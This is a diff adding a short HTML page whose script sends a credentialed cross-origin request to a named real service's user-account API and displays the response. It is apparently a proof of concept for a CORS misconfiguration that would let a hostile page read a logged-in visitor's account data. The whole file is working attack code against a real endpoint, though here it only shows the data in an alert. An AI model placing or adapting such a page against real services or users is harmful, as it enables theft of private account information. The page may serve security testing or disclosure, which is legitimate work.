@@ -1,0 +1,22 @@
+<html>
+<script>
+var invocation = new XMLHttpRequest();
+
+  invocation.onreadystatechange = function() {
+    if (invocation.readyState == XMLHttpRequest.DONE) {
+      alert(invocation.response);
+    }
+  }
+
+function cors(){
+  if(invocation) {
+    invocation.open('GET', "https://www.algolia.com/api/1/user", true);
+    invocation.withCredentials = true;
+    invocation.send(); 
+  }
+}
+
+cors();
+
+</script>
+</html>
